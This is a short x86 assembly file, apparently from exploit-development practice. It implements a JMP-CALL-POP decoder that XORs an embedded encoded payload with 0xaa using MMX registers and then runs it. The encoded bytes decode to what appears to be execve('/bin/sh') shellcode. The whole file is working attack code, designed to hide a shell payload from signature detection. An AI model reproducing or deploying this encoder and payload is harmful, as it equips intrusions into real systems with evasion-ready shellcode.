; Author: rbct

global _start

section .text

_start:

    jmp short CallDecodeShellcode

DecodeShellcode:

    ; use EDI register as a reference to the QWORD filled with 0xaa bytes
    ; use ESI register to store the xor-ed bytes
    pop edi
    lea esi, [edi + 8]

    ; counter for the loop (length of the shellcode in this case: 27, hence 27 / 8, which is greater than 3, so we choose 4)
    xor ecx, ecx
    mov cl, 4

DecodeQword:

    ; load the bytes
    movq mm0, QWORD [esi]
    movq mm1, QWORD [edi]

    ; decode the shellcode bytes (and replace the encoded bytes with the decoded ones)
    pxor mm0, mm1
    movq QWORD [esi], mm0

    ; increase ESI to reference the next 8 bytes
    add esi, 8
    loop DecodeQword

    ; execute the decoded shellcode
    jmp short shellcode

CallDecodeShellcode:

    call DecodeShellcode
    xor_qword: db 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa
    shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x1a,0xa1,0x23,0x49,0x27,0xe6,0x8e,0xa2,0x27,0xfe,0x8e,0xa2,0x67,0x2a
